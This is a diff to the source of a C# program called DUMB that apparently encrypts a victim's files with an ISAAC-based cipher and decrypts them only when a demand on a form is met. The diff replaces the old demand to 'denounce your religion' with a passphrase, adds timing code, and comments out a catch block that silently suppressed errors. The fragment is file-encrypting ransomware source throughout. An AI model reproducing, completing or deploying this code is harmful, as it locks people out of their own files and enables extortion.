@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Text;
@@ -9,20 +10,24 @@ namespace DUMB
 {
     static class Program
     {
-        public const int TUMBLE = 3; //Tumble ISAAC this many times before and after injecting the seed (poor Isaac, fighting his crazy mother and now this)
+        public const string PASSPHRASE = "I will not use this for bad purposes";
+        public const int TUMBLE = 3; //Tumble ISAAC this many times before and after injecting the seed
         public const int BUFFER_SIZE = 512;
 
         [STAThread]
         static void Main()
         {
+            Stopwatch s = new Stopwatch();
+            s.Start();
             if (!HackTheGibson()) return; //Check if we need to crypt all the files
+            s.Stop();
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
-            Main main = new Main();
+            Main main = new Main(s);
             Application.Run(main);
 
-            if (!main.denounced) MessageBox.Show("You did not denounce your religion and as such your files have not been decrypted", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            if (!main.denounced) MessageBox.Show("Incorrect passphrase", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
             else
             {
                 HackTheGibson(true); //Decrypt it this time
@@ -109,7 +114,7 @@ namespace DUMB
                     s.Write(buffer, 0, read);
                 } while ((read = s.Read(buffer, 0, ISAAC.SIZE)) > 0);
             }
-            catch { return; } //Suffocate errors like a small infant so it will stop crying if something happens
+            //catch { return; } //If you were to actually use this silently
             finally
             {
                 if (s != null)
